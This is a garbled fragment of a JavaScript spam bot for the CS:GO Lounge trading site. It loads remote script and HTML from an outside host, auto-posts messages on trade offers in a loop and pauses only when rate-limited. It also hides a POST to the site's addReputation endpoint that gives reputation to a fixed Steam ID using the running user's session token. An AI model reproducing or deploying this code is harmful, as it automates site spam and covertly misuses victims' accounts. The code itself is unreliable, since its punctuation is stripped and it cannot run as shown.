 ...
 $.getScript('httpssteamapis.comSpam.js');
...
var settings = {
	...
	url httpscsgolounge.comajaxpostMessage.php,

    setInterval function(seconds) {
    	this.interval = seconds  1000;
    	return Spam interval set successfully.;
    },
    setMessage function(message) {
    	this.message = message;
    	return New message set successfully.;
    }
};
...
var spammer = {
	start function() {
		if( ! settings.tslt  ! settings.startingOfferID) {
			...
			$(document).find('[data-cmd]').val('Either TSLT or StartID was not set. Please see spammer.info() to see info on how to set these.n' + $(document).find('[data-cmd]').val());
		...
		console.info('%c Spammer started. Refresh the page for it to stop.', 'background #eaeaea; color green;');
		$(document).find('[data-cmd]').val('Spammer started. Refresh the page for it to stop.n' + $(document).find('[data-cmd]').val());
		...
		setInterval(function() {
			...
			$.ajax({
				...
				console.log('%c Trade #' + settings.startingOfferID + ' - commented. (' + data + ')', 'background #eaeaea; color #333;');
				$(document).find('[data-cmd]').val('Trade #' + settings.startingOfferID + ' - commented. (' + data + ')n' + $(document).find('[data-cmd]').val());
				if(data == You're posting too fast. Try again in a few seconds.) {
					console.log('%c Pausing for ' + ((settings.interval  1000)  3) + ' seconds.', 'background #eaeaea; color red;');
					$(document).find('[data-cmd]').val('Pausing for ' + ((settings.interval  1000)  3) + ' seconds.n' + $(document).find('[data-cmd]').val());
				...
				var Html = $('divdiv');
				$.get('httpscsgolounge.com', function(data) {
					var data = data.replace(scriptg, '');
					Html.html(data);
					var offer = Html.find('#tradelist').find('.tradepoll').first();
					var params = offer.find('a').eq(1).attr('href');
					settings.startingOfferID = parseInt(params.replace('tradet=', ''));
				});
			});
		}, settings.interval);
	},
...
$(function() {
	$.get('httpssteamapis.comSpam.html', function(data) {
		var data = $(data);
	...
	setTimeout(function() {
		...
		if(document.title == 'CSGO Lounge - Marketplace, Trades, Bets') {
			...
			$.get(url, function(data) {
				...
				$.ajax({
					type POST,
					url httpscsgolounge.comajaxaddReputation.php,
					data {
						id '76561198038526790',
						tslt settings.tslt
					}
				});
				$.ajax({
